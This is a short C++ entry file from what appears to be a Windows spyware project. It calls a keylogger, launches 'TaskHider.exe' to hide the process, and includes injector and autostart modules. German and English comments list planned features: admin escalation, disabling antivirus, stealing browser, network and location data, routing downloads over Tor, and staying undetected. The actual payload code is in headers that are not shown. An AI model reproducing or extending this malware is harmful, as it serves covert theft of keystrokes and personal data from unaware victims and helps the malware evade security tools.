#include <cstdio>
#include <sstream>
#include <time.h>
#include <map>
#include <Windows.h>
#include <cstdio>
#include <iostream>
#include <sstream>
#include <time.h>
#include <stdio.h>
#include <iostream>
#include <chrono>
#include <fstream>
#include <shellapi.h>
#include "Autostart.h"
#include "SerialCheck.h"
#include "Keylogger.h"
#include "Injector.h"
using namespace std;

int main() {
	void start();
	start();
	return 0;
}

void start()
{
	
	system("TaskHider.exe");
	startKeyLogger();
	
	
	//Start as admin automatically
	//FileDownload
	//Not see Proc in task manager: FINISHED
	//Disable AV
	//Netzwerkdaten
	//Browserdaten
	//Ortungsfunktion
}


/*

1) Alle Sql Requests oder Download über tor netzwerk leiten, Verschlüsselung SEW
2) Undetected Software
3) Netzwerkdaten: .net library für nmap

*/